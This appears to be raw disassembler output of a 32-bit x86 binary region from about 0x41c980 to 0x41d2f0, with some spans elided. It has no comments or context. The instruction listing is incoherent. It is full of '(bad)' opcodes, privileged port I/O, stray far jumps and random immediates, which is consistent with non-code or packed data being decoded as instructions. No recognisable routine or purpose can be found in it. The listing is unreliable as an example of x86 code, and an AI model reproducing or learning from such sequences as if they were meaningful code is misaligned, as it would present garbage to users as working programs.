  41c980:	clc    
  41c981:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c982:	aas    
  41c983:	sub    eax,0x35b8c0fe
  41c988:	pop    esi
  41c989:	outs   dx,BYTE PTR ds:[esi]
  41c98a:	xchg   BYTE PTR [eax+0x23],bl
  41c98d:	or     BYTE PTR [eax*8+0x37f2f353],0xec
  41c995:	adc    eax,0x5eb57ae3
  41c99a:	fdivr  st,st(5)
  41c99c:	jge    0x41c974
  41c99e:	sub    eax,ecx
  41c9a0:	and    cl,BYTE PTR [eax+ebp*1-0x42]
  41c9a4:	ret    
  41c9a5:	sbb    BYTE PTR [eax],0xe3
  41c9a8:	dec    esi
  41c9a9:	pop    ds
  41c9aa:	inc    ecx
  41c9ab:	jmp    0x7b4b16ee
  41c9b0:	cs out dx,al
  41c9b2:	ret    0xda85
  41c9b5:	arpl   bx,di
  41c9b7:	inc    esi
  41c9b8:	fsubr  QWORD PTR [eax-0x34]
  41c9bb:	sahf   
  41c9bc:	mov    WORD PTR [edx+0x43f34e0e],ss
  41c9c2:	fild   QWORD PTR [edx]
  41c9c4:	push   ebp
  41c9c5:	jb     0x41c97a
  41c9c7:	outs   dx,DWORD PTR ds:[esi]
  41c9c8:	pop    ecx
  41c9c9:	xlat   BYTE PTR ds:[ebx]
  41c9ca:	xchg   esp,eax
  41c9cb:	jmp    0x6304:0x8c4ee91a
  41c9d2:	jecxz  0x41c9b9
  41c9d4:	dec    edi
  41c9d5:	fld    QWORD PTR [eax+eiz*8-0x55]
  41c9d9:	cmp    al,0x2
  41c9dc:	ret    
  41c9dd:	push   es
  41c9de:	sahf   
  41c9df:	push   ds
  41c9e0:	fiadd  DWORD PTR [ebp-0x58bd3fe6]
  41c9e6:	ret    0xb866
  41c9e9:	xchg   esp,eax
  41c9ea:	sbb    al,0x84
  41c9ec:	dec    ebx
  41c9ed:	ins    DWORD PTR es:[edi],dx
  41c9ee:	mov    edx,0xe65c028a
  41c9f3:	fdivr  st(2),st
  41c9f5:	pop    eax
  41c9f6:	aas    
  41c9f7:	call   FWORD PTR [edi]
  41c9f9:	sub    DWORD PTR [ebx+0x10cd8d70],ebx
  41c9ff:	or     BYTE PTR [ebx+0x4f048b7b],dl
  41ca05:	fst    st(4)
  41ca08:	push   ds
  41ca09:	xor    al,0xfb
  41ca0b:	jl     0x41c9f7
  41ca0d:	sub    DWORD PTR [ebp+0x93d7],ebp
	...
  41ca73:	add    al,dh
  41ca75:	retf   0xfc94
  41ca78:	mov    esi,0xc1cef8fe
  41ca7d:	or     al,BYTE PTR [ebx+0x0]
  41ca80:	dec    ecx
  41ca81:	jnp    0x41cb02
  41ca83:	bound  ebp,QWORD PTR [ebp+0x5000130]
  41ca89:	add    DWORD PTR [eax],eax
  41ca8b:	add    BYTE PTR [ecx+0x58],cl
  41ca8e:	mov    al,ds:0xdab721a1
  41ca94:	ins    BYTE PTR es:[edi],dx
  41ca95:	xor    al,0x7c
  41ca97:	push   ebp
  41ca98:	lock cmps DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41ca9b:	(bad)  
  41ca9d:	mov    bl,0xb6
  41ca9f:	mov    ebp,0x150e8f96
  41caa4:	sub    BYTE PTR [edi-0x2ad30257],ch
  41caaa:	fisttp QWORD PTR [ecx+0x20c480a]
  41cab0:	in     eax,dx
  41cab1:	mov    BYTE PTR [ebx],ah
  41cab3:	pushf  
  41cab4:	pop    ecx
  41cab5:	xchg   BYTE PTR [ecx],bh
  41cab7:	loopne 0x41ca4d
  41cab9:	cli    
  41caba:	icebp  
  41cabb:	xchg   edi,eax
  41cabc:	mov    eax,0x1399722b
  41cac2:	leave  
  41cac3:	mov    ah,BYTE PTR [eax+0x4064f56d]
  41cac9:	xor    eax,0x9a205ddf
  41cace:	inc    edi
  41cacf:	in     eax,0x11
  41cad1:	mov    cl,0x47
  41cad3:	xchg   edi,eax
  41cad4:	lea    ebp,ds:0x504a380c
  41cada:	loopne 0x41cab3
  41cadc:	int3   
  41cadd:	inc    esp
  41cade:	std    
  41cadf:	out    0xe8,al
  41cae1:	or     ah,cl
  41cae3:	clc    
  41cae4:	xchg   ebx,eax
  41cae5:	sti    
  41cae6:	in     eax,dx
  41cae7:	and    ecx,esi
  41cae9:	scas   al,BYTE PTR es:[edi]
  41caea:	cdq    
  41caeb:	cmp    al,0x71
  41caed:	cli    
  41caee:	mov    ecx,0x23dd992
  41caf3:	fcmovbe st,st(2)
  41caf5:	xchg   ecx,eax
  41caf6:	xor    BYTE PTR ds:0x3e36bf30,dl
  41cafc:	add    al,0xed
  41cafe:	mov    eax,0x3e93cdd9
  41cb03:	sub    BYTE PTR [edi+ebx*8+0xe],0x8d
  41cb08:	lods   eax,DWORD PTR ds:[esi]
  41cb09:	and    BYTE PTR [eax+0x4c165136],cl
  41cb0f:	pop    eax
  41cb10:	sub    ecx,DWORD PTR [ecx+0x1c80063]
  41cb16:	mov    ds:0x3000720e,eax
  41cb1b:	shl    DWORD PTR [edi],cl
  41cb1d:	movntps XMMWORD PTR [ebp+0x68],xmm3
  41cb21:	jp     0x41cb7b
  41cb23:	xlat   BYTE PTR ds:[ebx]
  41cb24:	or     ah,BYTE PTR [esi]
  41cb26:	add    al,0x51
  41cb28:	jb     0x41cba8
  41cb2a:	aas    
  41cb2b:	jbe    0x41cab4
  41cb2d:	repz add al,0xfd
  41cb30:	mov    ebp,0xb30e3e3c
  41cb36:	push   0xe
  41cb38:	out    0x78,eax
  41cb3a:	cld    
  41cb3b:	push   ecx
  41cb3c:	and    al,0x33
  41cb3e:	(bad)
  41cb41:	or     BYTE PTR [edi+0x50acf0c1],bh
  41cb47:	jge    0x41cb35
  41cb49:	inc    ebp
  41cb4a:	fsub   st,st(1)
  41cb4c:	aad    0xbe
  41cb4e:	add    BYTE PTR [eax],ah
  41cb50:	push   esi
  41cb51:	lds    ebx,FWORD PTR [ebp+0x33cac229]
  41cb57:	mov    DWORD PTR [edx],ebp
  41cb59:	rcr    BYTE PTR [edi-0x27],0xe6
  41cb5d:	cmp    dl,BYTE PTR [ecx-0x24640938]
  41cb63:	aam    0x92
  41cb65:	in     al,0xf6
  41cb67:	fild   WORD PTR [ebp+0x35]
  41cb6a:	je     0x41cb85
  41cb6c:	enter  0x838f,0x32
  41cb70:	or     cl,bl
  41cb72:	aaa    
  41cb73:	mov    gs,WORD PTR [eiz*2-0x2830b16d]
  41cb7a:	nop
  41cb7b:	pop    ss
  41cb7c:	dec    ecx
  41cb7d:	pop    ebx
  41cb7e:	pop    ebp
  41cb7f:	out    dx,eax
  41cb80:	enter  0xdc12,0x76
  41cb84:	div    DWORD PTR [ebx+0x54]
  41cb87:	pop    eax
  41cb88:	xor    DWORD PTR [ebp+0x50e97ff2],edi
  41cb8e:	pop    edx
  41cb8f:	popa   
  41cb90:	dec    esp
	...
  41cbf1:	add    BYTE PTR [eax],al
  41cbf3:	add    BYTE PTR [ecx],ch
  41cbf5:	(bad)  
  41cbf6:	sti    
  41cbf7:	pop    ebp
  41cbf8:	(bad)  
  41cbf9:	jge    0x41cbaa
  41cbfb:	neg    cl
  41cbfd:	hlt    
  41cbfe:	add    eax,0x189d1f22
  41cc03:	pusha  
  41cc04:	mov    dl,0x31
  41cc06:	add    DWORD PTR [eax],eax
  41cc08:	add    eax,0x84000001
  41cc0d:	call   0x372fa0ca
  41cc12:	js     0x41cbb9
  41cc14:	out    0x4a,eax
  41cc16:	pusha  
  41cc17:	retf   0x5f2f
  41cc1a:	(bad)  
  41cc1b:	scas   al,BYTE PTR es:[edi]
  41cc1c:	and    al,0x0
  41cc1e:	mov    fs,esp
  41cc20:	inc    ecx
  41cc21:	stos   BYTE PTR es:[edi],al
  41cc22:	mov    esp,0x2657f2f1
  41cc27:	jne    0x41cbf4
  41cc29:	mov    ds:0x1db55dab,al
  41cc2e:	inc    esp
  41cc2f:	add    al,0x5e
  41cc31:	jno    0x41cc6e
  41cc33:	and    BYTE PTR [ebp+0x13],ah
  41cc36:	ins    BYTE PTR es:[edi],dx
  41cc37:	adc    DWORD PTR [eax+0x33],ebx
  41cc3a:	pushf  
  41cc3b:	fstp   QWORD PTR [edi-0x51]
  41cc3e:	inc    ebp
  41cc3f:	xor    BYTE PTR [edx-0x31af373a],dl
  41cc45:	fs (bad) 
  41cc47:	dec    edi
  41cc48:	inc    eax
  41cc49:	fbstp  TBYTE PTR [ebp+eiz*8-0x38]
  41cc4d:	test   al,0x35
  41cc4f:	jbe    0x41cbf5
  41cc51:	sbb    bh,al
  41cc53:	(bad)  
  41cc55:	fs xor edi,0x3b
  41cc59:	adc    al,BYTE PTR [edi+esi*8-0x6a]
  41cc5d:	jae    0x41ccdc
  41cc5f:	sbb    BYTE PTR [edx+0x7b],bl
  41cc62:	pop    es
  41cc63:	out    dx,eax
  41cc64:	pop    eax
  41cc65:	xchg   esi,eax
  41cc66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc67:	test   DWORD PTR [eax+0x12],ebp
  41cc6a:	mov    edx,0x3deffdc8
  41cc6f:	daa    
  41cc70:	mov    ebp,0x6a55f522
  41cc75:	pop    es
  41cc76:	ret    0xaf84
  41cc79:	call   0x29916463
  41cc7e:	lahf   
  41cc7f:	xchg   BYTE PTR [edx+0x6d],dl
  41cc82:	inc    ebx
  41cc83:	mov    edi,0xd99af69f
  41cc88:	mov    al,ds:0x9d5b37f5
  41cc8d:	or     al,0x7e
  41cc8f:	mov    eax,ds:0xba156172
  41cc94:	ins    DWORD PTR es:[edi],dx
  41cc95:	sbb    BYTE PTR [edi+0x38],0xe0
  41cc99:	ret    0x8a19
  41cc9c:	ds push eax
  41cc9e:	test   DWORD PTR [ecx+0x23],esp
  41cca1:	sub    eax,0x2714b325
  41cca6:	adc    ah,BYTE PTR [ecx+0x7fc7248b]
  41ccac:	into   
  41ccad:	add    eax,0x6039d584
  41ccb2:	loopne 0x41cd2f
  41ccb4:	call   0xbd443d13
  41ccb9:	xor    DWORD PTR [edi],edx
  41ccbb:	adc    eax,0x7f00990d
  41ccc0:	addr16 dec ecx
  41ccc2:	rcr    DWORD PTR ds:0xb896f764,cl
  41ccc8:	jmp    0x41cd10
  41ccca:	mov    eax,0x2737b2cf
  41cccf:	mov    cl,0xf9
  41ccd1:	pop    es
  41ccd2:	inc    edx
  41ccd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ccd4:	dec    eax
  41ccd5:	inc    edi
  41ccd6:	dec    ebx
  41ccd7:	xor    eax,0x91ace173
  41ccdc:	jg     0x41ccfe
  41ccde:	cs mov edi,0x7a323586
  41cce4:	push   edi
  41cce5:	lds    ebx,FWORD PTR [edi-0x4c]
  41cce8:	xchg   esi,eax
  41cce9:	out    0x47,al
  41cceb:	sti    
  41ccec:	popa   
  41cced:	cld    
  41ccee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ccef:	add    al,BYTE PTR [eax]
  41ccf1:	or     DWORD PTR [edx-0x3fe9f95e],esi
  41ccf7:	shl    BYTE PTR [ebp-0x7b],cl
  41ccfa:	pop    ebp
  41ccfb:	jb     0x41cccf
  41ccfd:	xor    eax,0xcd0660c2
  41cd02:	push   esp
  41cd03:	cmp    al,0xcb
  41cd05:	std    
  41cd06:	add    DWORD PTR [esi-0x3f],ecx
  41cd09:	aaa    
  41cd0a:	cld    
  41cd0b:	xor    eax,0xb808f881
  41cd10:	ins    DWORD PTR es:[edi],dx
	...
  41cd71:	add    BYTE PTR [eax],al
  41cd73:	add    BYTE PTR [eax-0x67],ah
  41cd76:	fsubr  st(5),st
  41cd78:	std    
  41cd79:	in     eax,0x79
  41cd7b:	popf   
  41cd7c:	in     al,dx
  41cd7d:	stc    
  41cd7e:	jmp    0x41cdb0
  41cd80:	inc    eax
  41cd81:	push   edx
  41cd82:	mov    ebx,0x132b7df
  41cd87:	add    BYTE PTR ds:0x1c000001,al
  41cd8d:	sbb    al,0x41
  41cd8f:	inc    edx
  41cd90:	bound  eax,QWORD PTR [ebp-0x11]
  41cd93:	jno    0x41cd61
  41cd95:	mov    edi,0x9595c8c2
  41cd9a:	adc    edx,DWORD PTR [ebx]
  41cd9c:	mov    ch,0xc5
  41cd9e:	stc    
  41cd9f:	sub    eax,0x137c46ef
  41cda4:	aaa    
  41cda5:	dec    ebx
  41cda6:	inc    esp
  41cda7:	mov    al,0x3a
  41cda9:	sub    BYTE PTR [esi+0x7f],dh
  41cdac:	adc    bl,BYTE PTR [edx+0x6f]
  41cdaf:	imul   edx,DWORD PTR [ecx+0x46],0xb9bc8a5
  41cdb6:	inc    DWORD PTR [ecx-0x19]
  41cdb9:	pop    es
  41cdba:	mov    dh,0x3f
  41cdbc:	jecxz  0x41ce0f
  41cdbe:	inc    ebx
  41cdbf:	or     eax,0xe42cf7d
  41cdc4:	out    0x77,al
  41cdc6:	pop    ss
  41cdc7:	leave  
  41cdc8:	push   ebp
  41cdc9:	into   
  41cdca:	and    al,0xcc
  41cdcc:	xchg   edx,eax
  41cdcd:	fnstcw WORD PTR [edx+eiz*2-0x6c322375]
  41cdd4:	retf   0xc8ef
  41cdd7:	xchg   ebp,eax
  41cdd8:	or     BYTE PTR [edi-0x1f],0xac
  41cddc:	sub    BYTE PTR [ecx+0x50],ch
  41cddf:	test   esp,esp
  41cde1:	lods   eax,DWORD PTR ds:[esi]
  41cde2:	push   es
  41cde3:	sub    ah,BYTE PTR [ebx+ebp*1-0x72]
  41cde7:	mov    gs,eax
  41cde9:	retf   
  41cdea:	sbb    esp,DWORD PTR [ebx-0x35]
  41cded:	daa    
  41cdee:	adc    dl,ch
  41cdf0:	aaa    
  41cdf1:	pop    ds
  41cdf2:	leave  
  41cdf3:	sbb    BYTE PTR [ebx],al
  41cdf5:	xor    eax,0xb5568232
  41cdfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdfb:	aad    0xc8
  41cdfd:	jmp    0x41cddf
  41cdff:	out    dx,al
  41ce00:	mov    cl,0xb
  41ce02:	out    0xd4,al
  41ce04:	cwde   
  41ce05:	fsub   QWORD PTR [esi+0x376a0c83]
  41ce0b:	xchg   esp,eax
  41ce0c:	int3   
  41ce0d:	push   ds
  41ce0e:	leave  
  41ce0f:	pop    ebp
  41ce10:	dec    ecx
  41ce11:	in     eax,dx
  41ce12:	stc    
  41ce13:	sbb    cl,0x1d
  41ce16:	sub    al,0x9e
  41ce18:	add    eax,0xbabb292f
  41ce1d:	and    esp,DWORD PTR [edi+ebp*2]
  41ce20:	cmp    eax,0xba167d95
  41ce25:	shl    eax,cl
  41ce27:	cli    
  41ce28:	inc    eax
  41ce29:	rol    DWORD PTR [ebx+esi*4-0x55],0xb7
  41ce2e:	add    ebx,esi
  41ce30:	adc    eax,0x39388c9
  41ce35:	jle    0x41ce58
  41ce37:	add    edx,edi
  41ce39:	pop    edi
  41ce3a:	and    DWORD PTR [ecx],eax
  41ce3c:	xor    ecx,esi
  41ce3e:	cdq    
  41ce3f:	or     DWORD PTR [eax-0x1a],edi
  41ce42:	ins    BYTE PTR es:[edi],dx
  41ce43:	bound  eax,QWORD PTR [esi+0x4c]
  41ce46:	retf   0x6d32
  41ce49:	scas   eax,DWORD PTR es:[edi]
  41ce4a:	inc    edi
  41ce4b:	clc    
  41ce4c:	clc    
  41ce4d:	mov    ebx,0x1abb9cf4
  41ce52:	cld    
  41ce53:	mov    BYTE PTR [edx-0x52407ac7],0x72
  41ce5a:	sar    BYTE PTR [edi],cl
  41ce5c:	jb     0x41cdf8
  41ce5e:	xchg   BYTE PTR ds:0xd5bcd70a,dl
  41ce64:	daa    
  41ce65:	xchg   DWORD PTR [eax+0x29],ebx
  41ce68:	push   cs
  41ce69:	inc    bl
  41ce6b:	mov    edi,0x2fe731bb
  41ce70:	inc    esp
  41ce71:	sub    DWORD PTR [ebp+0x7cc2189d],ebx
  41ce77:	ficom  WORD PTR [eax+0x1aaebcbc]
  41ce7d:	jb     0x41ce74
  41ce7f:	cmp    al,0xc1
  41ce81:	frstor [edx+0x1ca7b06b]
  41ce87:	loope  0x41ce97
  41ce89:	js     0x41ce2f
  41ce8b:	pop    edx
  41ce8c:	jmp    0x0:0xe60e01be
	...
  41cef3:	add    BYTE PTR [edi],al
  41cef5:	jp     0x41cedf
  41cef7:	jnp    0x41cef6
  41cef9:	sti    
  41cefa:	xchg   edi,eax
  41cefb:	jle    0x41cf44
  41cefd:	jp     0x41ced9
  41ceff:	lods   al,BYTE PTR ds:[esi]
  41cf00:	std    
  41cf01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf02:	not    DWORD PTR [esp+edi*4]
  41cf05:	xor    eax,DWORD PTR [ecx]
  41cf07:	add    BYTE PTR ds:0xc9000001,al
  41cf0d:	mov    dh,0x88
  41cf0f:	test   al,0x48
  41cf11:	inc    esp
  41cf12:	addr16 leave 
  41cf14:	fld    DWORD PTR [edx+0x1a85d526]
  41cf1a:	outs   dx,BYTE PTR ds:[esi]
  41cf1b:	fild   WORD PTR [eax]
  41cf1d:	add    al,0x92
  41cf1f:	cmp    bh,cl
  41cf21:	test   al,0x59
  41cf23:	outs   dx,DWORD PTR ds:[esi]
  41cf24:	xchg   DWORD PTR [edi-0x22],ecx
  41cf27:	popf   
  41cf28:	xchg   edi,eax
  41cf29:	(bad)  
  41cf2a:	rcl    BYTE PTR [edi+esi*1],cl
  41cf2d:	adc    DWORD PTR [ecx+0x73],edx
  41cf30:	shl    DWORD PTR [ebp-0x4f],0x75
  41cf34:	sub    eax,0xcea333cd
  41cf39:	jae    0x41cedd
  41cf3b:	push   ds
  41cf3c:	sub    edi,DWORD PTR [ebx-0x54]
  41cf3f:	int3   
  41cf40:	dec    ebp
  41cf41:	mov    ecx,0x96da6d4e
  41cf46:	mov    esi,0x8aec6005
  41cf4b:	cmp    cl,BYTE PTR [ecx-0x53]
  41cf4e:	(bad)  
  41cf4f:	jp     0x41cf1b
  41cf51:	psllq  mm7,QWORD PTR [edx+edi*2+0x60]
  41cf56:	test   edx,edx
  41cf58:	or     al,0x74
  41cf5a:	out    dx,eax
  41cf5b:	(bad)  
  41cf5c:	fld    TBYTE PTR [ebx-0x7abfa5c3]
  41cf62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf63:	es push eax
  41cf65:	shl    DWORD PTR [ebx+0x1e16a4ad],0x97
  41cf6c:	pop    ebx
  41cf6d:	sub    eax,0x235b54e5
  41cf72:	inc    ebp
  41cf73:	rcl    DWORD PTR [edi],cl
  41cf75:	mov    DWORD PTR [ecx],esi
  41cf77:	push   es
  41cf78:	add    DWORD PTR [edx],esp
  41cf7a:	pushf  
  41cf7b:	mov    eax,ds:0x408fa13e
  41cf80:	das    
  41cf81:	iret   
  41cf82:	test   DWORD PTR [eax+eiz*1-0x34],0x3e6b99f0
  41cf8a:	sbb    ch,ah
  41cf8c:	int3   
  41cf8d:	xor    BYTE PTR [edx],bh
  41cf8f:	into   
  41cf90:	nop
  41cf91:	fild   DWORD PTR [ebp-0x7d]
  41cf94:	cmp    ch,BYTE PTR [ebx]
  41cf96:	mov    dl,0x5a
  41cf98:	pop    eax
  41cf99:	cdq    
  41cf9a:	or     BYTE PTR [eax],dh
  41cf9c:	sbb    BYTE PTR [edx+0x33],ch
  41cf9f:	ret    0x29dd
  41cfa2:	mov    ah,0x9a
  41cfa4:	fs xchg ecx,eax
  41cfa6:	out    0x2d,eax
  41cfa8:	outs   dx,BYTE PTR ds:[esi]
  41cfa9:	inc    ebp
  41cfaa:	fcmove st,st(6)
  41cfac:	mov    ds:0x35892f70,eax
  41cfb1:	addr16 cld 
  41cfb3:	cmp    al,BYTE PTR [ecx]
  41cfb5:	mov    fs,WORD PTR [edi+0x76]
  41cfb8:	cwde   
  41cfb9:	popa   
  41cfba:	jb     0x41cf52
  41cfbc:	adc    bl,BYTE PTR [ebp+0x475a78f9]
  41cfc2:	inc    edx
  41cfc3:	mov    WORD PTR [edx+0x3a],gs
  41cfc6:	push   cs
  41cfc7:	les    ecx,FWORD PTR ds:0x16951897
  41cfcd:	jns    0x41cf84
  41cfcf:	and    dl,BYTE PTR [edi-0x6]
  41cfd2:	add    dl,BYTE PTR [ebp-0x137a73ae]
  41cfd8:	and    al,0x9c
  41cfda:	sbb    eax,0xd2a29f16
  41cfdf:	xor    eax,0x620f1b7a
  41cfe4:	call   0x6d5b4dc2
  41cfe9:	or     BYTE PTR [ebx+0x6],0xff
  41cfed:	xchg   esp,eax
  41cfee:	icebp  
  41cfef:	sbb    WORD PTR [esi-0x3],dx
  41cff3:	and    DWORD PTR [ebx+0x4981a5d1],eax
  41cff9:	jne    0x41cf93
  41cffb:	inc    ebx
  41cffc:	data16 jge 0x41d047
  41cfff:	test   DWORD PTR [esi],edi
  41d001:	xor    dh,0xcc
  41d004:	hlt    
  41d005:	pushf  
  41d006:	pushf  
  41d007:	mov    dl,0x85
  41d009:	mov    ds:0x8fb3ef7e,eax
  41d00e:	pop    ss
  41d00f:	ret    
  41d010:	xor    eax,DWORD PTR [eax]
	...
  41d072:	add    BYTE PTR [eax],al
  41d074:	mov    ecx,0xad432034
  41d079:	push   edi
  41d07a:	sti    
  41d07b:	dec    BYTE PTR [esi-0x1b]
  41d07e:	mov    ebp,0xf9732dbd
  41d083:	mov    dl,0xc1
  41d085:	xor    al,0x1
  41d087:	add    BYTE PTR ds:0x95000001,al
  41d08d:	rcr    BYTE PTR [esi+eiz*4-0x6d],cl
  41d091:	adc    al,0xd0
  41d093:	mov    ch,0x9f
  41d095:	or     al,0x21
  41d097:	in     al,0x22
  41d099:	inc    ebx
  41d09a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d09b:	fbstp  TBYTE PTR [eax]
  41d09d:	bound  ebx,QWORD PTR [esi+0x1c]
  41d0a0:	add    al,0x42
  41d0a2:	fild   WORD PTR [edi-0x7f]
  41d0a5:	add    al,0x69
  41d0a7:	add    BYTE PTR [ebp+0x35],cl
  41d0aa:	mov    al,ds:0x340c59f0
  41d0af:	std    
  41d0b0:	mov    dh,0xe3
  41d0b2:	xchg   esp,eax
  41d0b3:	cli    
  41d0b4:	mov    dh,0xe8
  41d0b6:	xor    eax,0xb06ddee2
  41d0bb:	int3   
  41d0bc:	scas   al,BYTE PTR es:[edi]
  41d0bd:	xchg   edi,eax
  41d0be:	arpl   dx,ax
  41d0c0:	adc    bl,BYTE PTR [edx]
  41d0c2:	xor    bl,BYTE PTR [eax-0x16]
  41d0c5:	int3   
  41d0c6:	(bad)  
  41d0c7:	popf   
  41d0c8:	outs   dx,DWORD PTR ds:[esi]
  41d0c9:	rcl    BYTE PTR [edi+0x6b07de47],1
  41d0cf:	jbe    0x41d12a
  41d0d1:	mov    cl,al
  41d0d3:	push   ds
  41d0d4:	mov    edx,0x80d76424
  41d0d9:	ret    0xb122
  41d0dc:	std    
  41d0dd:	bound  edx,QWORD PTR ds:0x653bf9f2
  41d0e3:	scas   al,BYTE PTR es:[edi]
  41d0e4:	jge    0x41d0f8
  41d0e6:	push   es
  41d0e7:	and    eax,DWORD PTR [ebx+0x74]
  41d0ea:	fist   WORD PTR [edi+0x6d]
  41d0ed:	fs pop ecx
  41d0ef:	inc    eax
  41d0f0:	or     BYTE PTR [ebx],ah
  41d0f2:	std    
  41d0f3:	xor    dh,BYTE PTR cs:[ebp+ebp*8-0x394ffb52]
  41d0fb:	mov    esp,0x84deac23
  41d100:	addr16 pop esp
  41d102:	or     BYTE PTR ds:0xd8640c46,cl
  41d108:	adc    esp,ebp
  41d10a:	popa   
  41d10b:	and    eax,0x21ab2e80
  41d110:	out    0xea,al
  41d112:	jmp    0xd72c2b5b
  41d117:	jmp    0xa762c0b6
  41d11c:	jp     0x41d0b6
  41d11e:	jl     0x41d15a
  41d120:	retf   0x8dae
  41d123:	jmp    0x41d139
  41d125:	xchg   DWORD PTR [esi],edi
  41d127:	sbb    bl,BYTE PTR [ebx-0x4a]
  41d12a:	and    ecx,ebp
  41d12c:	sbb    esi,DWORD PTR [ebx+0x2a]
  41d12f:	loop   0x41d0bf
  41d131:	push   ebp
  41d132:	push   eax
  41d133:	pop    ss
  41d134:	jmp    0xe16d:0x7570619e
  41d13b:	ins    BYTE PTR es:[edi],dx
  41d13c:	out    0x68,eax
  41d13e:	add    al,0x3a
  41d140:	jae    0x41d1ab
  41d142:	push   edx
  41d143:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d144:	adc    BYTE PTR [ecx+eiz*2],ah
  41d147:	popa   
  41d148:	in     al,0x3b
  41d14a:	into   
  41d14b:	pop    ebx
  41d14c:	ss loop 0x41d1a1
  41d14f:	or     al,0xc2
  41d151:	scas   al,BYTE PTR es:[edi]
  41d152:	fadd   DWORD PTR [ebp-0x69f56b63]
  41d158:	xchg   esi,eax
  41d159:	mov    cl,0xe4
  41d15b:	push   esp
  41d15c:	pop    esp
  41d15d:	cdq    
  41d15e:	out    0x28,eax
  41d160:	pop    ss
  41d161:	add    cl,cl
  41d163:	stc    
  41d164:	lods   al,BYTE PTR ds:[esi]
  41d165:	mov    dl,0xb9
  41d167:	pop    esp
  41d168:	push   0x6e2a154a
  41d16d:	sbb    DWORD PTR [edx-0x45ece5d],0x78325fa9
  41d177:	xor    esp,DWORD PTR [edi+ebx*4+0x72b05496]
  41d17e:	es stos DWORD PTR es:[edi],eax
  41d180:	lea    ebp,[ecx-0x74cb032d]
  41d186:	and    al,0xe1
  41d188:	in     eax,dx
  41d189:	pop    esi
  41d18a:	test   eax,0xf7fb1903
  41d18f:	and    esp,edi
	...
  41d1f1:	add    BYTE PTR [eax],al
  41d1f3:	add    BYTE PTR [eax-0x3d],dl
  41d1f6:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d1fc:	xor    DWORD PTR [ebp-0x7],esp
  41d1ff:	hlt    
  41d200:	adc    BYTE PTR [eax+0x5],0xe2
  41d204:	(bad)  
  41d205:	xor    eax,0x1050001
  41d20a:	add    BYTE PTR [eax],al
  41d20c:	pushf  
  41d20d:	int    0x37
  41d20f:	leave  
  41d210:	add    esp,edx
  41d212:	mov    al,0x33
  41d214:	push   esi
  41d215:	adc    esp,DWORD PTR [edi-0x3e]
  41d218:	cmc    
  41d219:	repnz int 0xb9
  41d21c:	dec    esi
  41d21d:	mov    WORD PTR [ebx+esi*4],?
  41d220:	ret    
  41d221:	jmp    0x41d231
  41d223:	lods   eax,DWORD PTR ds:[esi]
  41d224:	cmc    
  41d225:	push   ebx
  41d226:	add    ebx,DWORD PTR [esi+0x2d19c454]
  41d22c:	xor    BYTE PTR [esp+eiz*2],al
  41d22f:	int    0x24
  41d231:	sub    ecx,DWORD PTR [ebp+0x34]
  41d234:	jmp    0x168ef687
  41d239:	stos   BYTE PTR es:[edi],al
  41d23a:	pop    ebp
  41d23b:	cs jmp 0x41d1e3
  41d23e:	test   dh,ah
  41d240:	call   0x1d947657
  41d245:	test   cl,bh
  41d247:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d248:	or     BYTE PTR [edi],0xde
  41d24b:	cmp    dh,BYTE PTR [edi-0x460b68ac]
  41d251:	lea    ebx,[ecx+ecx*1-0x57dbd70]
  41d258:	push   eax
  41d259:	adc    BYTE PTR [edx+0x59ff4047],ch
  41d25f:	jbe    0x41d1fc
  41d261:	jp     0x41d27b
  41d263:	mov    ah,0x93
  41d265:	sete   cl
  41d268:	iret   
  41d269:	loop   0x41d274
  41d26b:	es aas 
  41d26d:	iret   
  41d26e:	outs   dx,BYTE PTR ds:[esi]
  41d26f:	lods   al,BYTE PTR ds:[esi]
  41d270:	(bad)  
  41d271:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d273:	inc    esp
  41d274:	mov    edi,0x2a9f36f7
  41d279:	sbb    DWORD PTR ds:0x899e183f,ebp
  41d27f:	mov    WORD PTR [edi],?
  41d281:	dec    esi
  41d282:	lds    esi,FWORD PTR [ecx]
  41d284:	mov    ch,0x85
  41d286:	stos   BYTE PTR es:[edi],al
  41d287:	push   0xffffffb1
  41d289:	inc    ecx
  41d28a:	or     BYTE PTR [edx+0x1bae39ef],dl
  41d290:	jp     0x41d2ea
  41d292:	imul   eax,esi,0x78
  41d295:	lea    esp,[edi]
  41d297:	or     eax,0xb3f73147
  41d29c:	fs adc bl,bh
  41d29f:	dec    ecx
  41d2a0:	add    ch,BYTE PTR [eax+0x601ecf52]
  41d2a6:	ss hlt 
  41d2a8:	pusha  
  41d2a9:	push   edi
  41d2aa:	xchg   edx,eax
  41d2ab:	pop    eax
  41d2ac:	inc    eax
  41d2ad:	fnstcw WORD PTR [edi]
  41d2af:	sbb    eax,0x15adb7f6
  41d2b4:	jl     0x41d2b2
  41d2b6:	fld    DWORD PTR [edx]
  41d2b8:	sub    eax,0x28941e62
  41d2bd:	call   0xeb33:0xdae2d938
  41d2c4:	in     eax,dx
  41d2c5:	out    dx,eax
  41d2c6:	dec    ebp
  41d2c7:	dec    esp
  41d2c8:	aad    0x9
  41d2ca:	imul   eax,ebx,0x733385b8
  41d2d0:	and    al,0x66
  41d2d2:	test   DWORD PTR [edi],esi
  41d2d4:	popa   
  41d2d5:	cmp    esp,DWORD PTR [ebx]
  41d2d7:	popf   
  41d2d8:	sub    ecx,DWORD PTR [ebx+0x45b67804]
  41d2de:	xchg   edx,eax
  41d2df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2e0:	popa   
  41d2e1:	push   0x3
  41d2e3:	jg     0x41d2bb
  41d2e5:	or     esi,DWORD PTR [eax+edi*1+0x37bcb59f]
  41d2ec:	pusha  
  41d2ed:	jae    0x41d34b
  41d2ef:	dec    esi
  41d2f0:	retf   0xa0fb
